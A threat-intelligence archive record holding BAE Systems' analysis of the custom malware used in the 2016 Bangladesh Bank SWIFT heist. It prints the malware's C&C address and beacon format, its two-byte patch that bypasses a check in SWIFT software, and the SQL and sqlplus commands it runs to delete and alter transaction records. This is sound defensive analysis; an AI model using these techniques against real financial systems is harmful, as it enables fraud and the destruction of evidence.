{
    "id": "6f0644c6-5f83-42fa-b0a3-31ac959cd785",
    "created_at": "2022-10-25T16:48:22.767352Z",
    "updated_at": "2025-03-27T02:05:53.211669Z",
    "deleted_at": null,
    "sha1_hash": "0387df8bdfbe771ec7ee80715c58afac76266a0e",
    "title": "Two Bytes to $951M",
    "authors": "BAE Systems",
    "file_creation_date": "2017-06-28T04:05:24Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 196245,
    "plain_text": "# y $\n\n**[baesystemsai.blogspot.co.uk](http://baesystemsai.blogspot.co.uk/2016/04/two-bytes-to-951m.html)** /2016/04/two-bytes-to-951m.html\n\nIn February 2016 one of the largest cyber heists was committed and subsequently disclosed. An unknown attacker\ngained access to the Bangladesh Bank’s (BB) SWIFT payment system and reportedly instructed an American bank\nto transfer money from BB’s account to accounts in The Philippines. The attackers attempted to steal $951m, of\nwhich $81m is still unaccounted for.\n\nThe technical details of the attack have yet to be made public, however we’ve recently identified tools uploaded to\nonline malware repositories that we believe are linked to the heist. The custom malware was submitted by a user in\nBangladesh, and contains sophisticated functionality for interacting with local SWIFT Alliance Access software\nrunning in the victim infrastructure.\n\nThis malware appears to be just part of a wider attack toolkit, and would have been used to cover the attackers’\ntracks as they sent forged payment instructions to make the transfers. This would have hampered the detection and\nresponse to the attack, giving more time for the subsequent money laundering to take place.\n\nThe tools are highly configurable and given the correct access could feasibly be used for similar attacks in the future.\n\n## Malware samples\n\nSHA1 Compile time Size (bytes) Filename\n\n525a8e3ae4e3df8c9c61f2a49e38541d196e9228 2016-02-05 11:46:20 65,536 evtdiag.exe\n\n76bab478dcc70f979ce62cd306e9ba50ee84e37e 2016-02-04 13:45:39 16,384 evtsys.exe\n\n70bf16597e375ad691f2c1efa194dbe7f60e4eeb 2016-02-05 08:55:19 24,576 nroff_b.exe\n\n6207b92842b28a438330a2bf0ee8dcab7ef0a163 N/A 33,848 gpca.dat\n\nWe believe all files were created by the same actor(s), but the main focus of the report will be on\n525a8e3ae4e3df8c9c61f2a49e38541d196e9228 as this is the component that contains logic for interacting\nwith the SWIFT software.\n\nThe malware registers itself as a service and operates within an environment running SWIFT’s Alliance software\nsuite, powered by an Oracle Database.\n\n|SHA1|Compile time|Size (bytes)|Filename|\n|---|---|---|---|\n|525a8e3ae4e3df8c9c61f2a49e38541d196e9228|2016-02-05 11:46:20|65,536|evtdiag.exe|\n|76bab478dcc70f979ce62cd306e9ba50ee84e37e|2016-02-04 13:45:39|16,384|evtsys.exe|\n|70bf16597e375ad691f2c1efa194dbe7f60e4eeb|2016-02-05 08:55:19|24,576|nroff_b.exe|\n|6207b92842b28a438330a2bf0ee8dcab7ef0a163|N/A|33,848|gpca.dat|\n\n\n-----\n\nThe main purpose is to inspect SWIFT messages for strings defined in the configuration file. From these messages,\nthe malware can extract fields such as transfer references and SWIFT addresses to interact with the system\ndatabase. These details are then used to delete specific transactions, or update transaction amounts appearing in\nbalance reporting messages based on the amount of Convertible Currency available in specific accounts.\n\nThis functionality runs in a loop until 6am on 6th February 2016. This is significant given the transfers are believed to\nhave occurred in the two days prior to this date. The tool was custom made for this job, and shows a significant level\nof knowledge of SWIFT Alliance Access software as well as good malware coding skills.\n\n## Malware config and logging\n\nWhen run, the malware decrypts the contents of its configuration file, using the RC4 key:\n\n4e 38 1f a7 7f 08 cc aa 0d 56 ed ef f9 ed 08\nef\n\nThis configuration is located in the following directory on the victim device:\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\gpca.dat\n\nThe configuration file contains a list of transaction IDs, some additional environment information, and the following\nIP address to be used for command-and-control (C&C):\n\n196.202.103.174\n\nThe sample also uses the following file for logging:\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\recas.dat\n\n## Module patching\n\n\n-----\n\nbytes in its memory at a specific offset. The patch will replace 2 bytes 0x75 and 0x04 with the bytes 0x90 and\n0x90.\n\nThese two bytes are the JNZ opcode, briefly explained as 'if the result of the previous comparison operation is not\n_zero, then jump into the address that follows this instruction, plus 4 bytes'._\n\nEssentially, this opcode is a conditional jump instruction that follows some important check, such as a key validity\ncheck or authorisation success check.\n\nThe patch will replace this 2-byte conditional jump with 2 'do-nothing' (NOP) instructions, effectively forcing the host\napplication to believe that the failed check has in fact succeeded.\n\nFor example, the original code could look like:\n\n85 C0       test eax, eax ; some important check\n75 04       jnz failed  ; if failed, jump to 'failed' label below\n33 c0       xor eax, eax ; otherwise, set result to 0 (success)\neb 17       jmp exit   ; and then exit\nfailed:\nB8 01 00 00 00  mov eax, 1  ; set result to 1 (failure)\n\nOnce it's patched, it would look like:\n\n85 C0       test eax, eax ; some important check\n90        nop      ; 'do nothing' in place of 0x75\n90        nop      ; 'do nothing' in place of 0x04\n33 c0       xor eax, eax ; always set result to 0 (success)\neb 17       jmp exit   ; and then exit\nfailed:\nB8 01 00 00 00  mov eax, 1  ; never reached: set result to 1 (fail)\n\nAs a result, the important check result will be ignored, and the code will never jump to 'failed'. Instead, it will proceed\ninto setting result to 0 (success).\n\nThe liboradb.dll module belongs to SWIFT's Alliance software suite, powered by Oracle Database, and is\nresponsible for\n\n\n-----\n\n   - Starting the database;\n\n   - Performing database backup & restore functions.\n\nBy modifying the local instance of SWIFT Alliance Access software, the malware grants itself the ability to execute\ndatabase transactions within the victim network.\n\n## SWIFT message monitoring\n\nThe malware monitors SWIFT Financial Application (FIN) messages, by parsing the contents of the files *.prc and\n*.fal located within the directories:\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcm\\in\\\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcm\\out\\\n\nIt parses the messages, looking for strings defined in gpca.dat. We expect these will be unique identifiers that\nidentify malicious transactions initiated by the attackers. If present, it then attempts to extract a MESG_TRN_REF and\nMESG_SENDER_SWIFT_ADDRESS from that same message by looking for the following hard coded strings:\n\n\"FIN 900 Confirmation of Debit\"\n\"20: Transaction\"\n\"Sender :\"\n\n[additional filters from the decrypted configuration file\ngpca.dat]\n\nThe malware will use this extracted data to form valid SQL statements. It attempts to retrieve the SWIFT unique\nmessage ID (MESG_S_UMID) that corresponds to the transfer reference and sender address retrieved earlier:\n\nSELECT MESG_S_UMID FROM SAAOWNER.MESG_%s WHERE MESG_SENDER_SWIFT_ADDRESS LIKE\n'%%%s%%' AND MESG_TRN_REF LIKE '%%%s%%';\n\nThe MESG_S_UMID is then passed to DELETE statements, deleting the transaction from the local database.\n\nDELETE FROM SAAOWNER.MESG_%s WHERE MESG_S_UMID =\n'%s';\nDELETE FROM SAAOWNER.TEXT_%s WHERE TEXT_S_UMID =\n'%s';\n\nThe SQL statements are dropped into a temporary file with the 'SQL' prefix. The SQL statements are prepended\nwith the following prefixed statements:\n\nset heading off;\nset linesize\n32567;\nSET FEEDBACK OFF;\nSET ECHO OFF;\nSET FEED OFF;\nSET VERIFY OFF;\n\n\n-----\n\ncmd.exe /c echo exit | sqlplus -S / as sysdba @[SQL_Statements] >\n\n[OUTPUT_FILE]\n\n## Login monitoring\n\nAfter start up the malware falls into a loop where it constantly checks for the journal record that contains the \"Login\"\nstring in it:\n\nSELECT * FROM (SELECT JRNL_DISPLAY_TEXT, JRNL_DATE_TIME FROM SAAOWNER.JRNL_%s WHERE\nJRNL_DISPLAY_TEXT LIKE '%%LT BBHOBDDHA: Log%%' ORDER BY JRNL_DATE_TIME DESC) A WHERE\nROWNUM = 1;\n\nNOTE: ‘BBHOBDDH’ is the SWIFT code for the Bangladesh Bank in Dhaka.\n\nIf it fails to find the \"Login\" record, it falls asleep for 5 seconds and then tries again. Once the \"Login\" record is\nfound, the malware sends a GET request to the remote C&C.\n\nThe GET request has the format:\n\n[C&C_server]/al?\n\n[data]\n\nThe malware notifies the remote C&C each hour of events, sending \"---O\" if the \"Login\" (open) event occurred,\n\"---C\" in case \"Logout\" (close) event occurred, or \"---N\" if neither of the events occurred, e.g.:\n\n[C&C_server]/al?--O\n\n## Manipulating balances\n\nThe malware monitors all SWIFT messages found in:\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcp\\in\\*.*\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcp\\out\\*.*\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcp\\unk\\*.*\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcs\\nfzp\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcs\\nfzf\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcs\\fofp\n\n[ROOT_DRIVE]:\\Users\\Administrator\\AppData\\Local\\Allians\\mcs\\foff\n\nThe messages are parsed looking for information tagged with the following strings:\n\n\n-----\n\n: Debit\n\"Debit/Credit :\"\n\"Sender :\"\n\"Amount :\"\n\"FEDERAL RESERVE\nBANK\"\n\" D\"\n\" C\"\n\"62F: \"\n“60F: \"\n\"60M: \"\n\"62M: \"\n\"Credit\"\n\"Debit\"\n\" 64: \"\n\" 20: Transaction\"\n\"90B: Price\"\n\nFor example, the \"62F:\" field specifies the closing balance, \"60F:\" is opening balance, \"19A:\" is transaction\namount.\n\nThe malware also checks if the messages contain a filter specified within the configuration file gpca.dat.\n\nThe logged in account, as seen from the journal, is then used to check how much Convertible Currency amount (\nMESG_FIN_CCY_AMOUNT) it has available:\n\nSELECT MESG_FIN_CCY_AMOUNT FROM SAAOWNER.MESG_%s WHERE MESG_S_UMID =\n'%s';\n\nAlternatively, it can query for a message for a specified sender with a specified amount of Convertible Currency:\n\nSELECT MESG_S_UMID FROM SAAOWNER.MESG_%s WHERE MESG_SENDER_SWIFT_ADDRESS LIKE\n'%%%s%%' AND MESG_FIN_CCY_AMOUNT LIKE '%%%s%%';\n\nThe amount of Convertible Currency is then manipulated in the message by changing it to the arbitrary value (\nSET\nMESG_FIN_CCY_AMOUNT ):\n\nUPDATE SAAOWNER.MESG_%s SET MESG_FIN_CCY_AMOUNT = '%s' WHERE MESG_S_UMID = '%s';\nUPDATE SAAOWNER.TEXT_%s SET TEXT_DATA_BLOCK = UTL_RAW.CAST_TO_VARCHAR2('%s') WHERE\nTEXT_S_UMID = '%s';\n\n## Printer manipulation\n\nIn order to hide the fraudulent transactions carried out by the attacker(s), the database/message manipulations are\nnot sufficient. SWIFT network also generates confirmation messages, and these messages are sent by the software\nfor printing. If the fraudulent transaction confirmations are printed out, the banking officials can spot an anomaly and\nthen respond appropriately to stop such transactions from happening.\n\nHence the malware also intercepts the confirmation SWIFT messages and then sends for printing the 'doctored'\n\n\n-----\n\nTo achieve that, the SWIFT messages the malware locates are read, parsed, and converted into PRT files that\ndescribe the text in Printer Command Language (PCL).\n\nThese temporary PRT files are then submitted for printing by using another executable file called nroff.exe, a\nlegitimate tool from the SWIFT software suite.\n\nThe PCL language used specifies the printer model, which is _\"HP LaserJet 400 M401\":_\n\nOnce sent for printing, the PRT files are then overwritten\nwith '0's (reliably deleted).\n\n## CONCLUSIONS\n\nThe analysed sample allows a glimpse into the toolkit of one\nof the team in well-planned bank heist. Many pieces of the\npuzzle are still missing though: how the attackers sent the\nfraudulent transfers; how the malware was implanted; and\ncrucially, who was behind this.\n\nThis malware was written bespoke for attacking a specific\nvictim infrastructure, but the general tools, techniques and\nprocedures used in the attack may allow the gang to strike again. All financial institutions who run SWIFT Alliance\nAccess and similar systems should be seriously reviewing their security now to make sure they too are not exposed.\n\nThis attacker put significant effort into deleting evidence of their activities, subverting normal business processes to\nremain undetected and hampering the response from the victim. The wider lesson learned here may be that\ncriminals are conducting more and more sophisticated attacks against victim organisations, particularly in the area\nof network intrusions (which has traditionally been the domain of the ‘APT’ actor). As the threat evolves, businesses\nand other network owners need to ensure they are prepared to keep up with the evolving challenge of securing\ncritical systems.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/49t6zpzjln2vvm2npdnzwtr0hkrxq37v"
    ],
    "report_names": [
        "BAESystems_SSA-Two-bytes-to-951m(04-25-2016)"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1498622724,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/0387df8bdfbe771ec7ee80715c58afac76266a0e.pdf",
        "text": "https://archive.orkl.eu/0387df8bdfbe771ec7ee80715c58afac76266a0e.txt",
        "img": "https://archive.orkl.eu/0387df8bdfbe771ec7ee80715c58afac76266a0e.jpg"
    }
}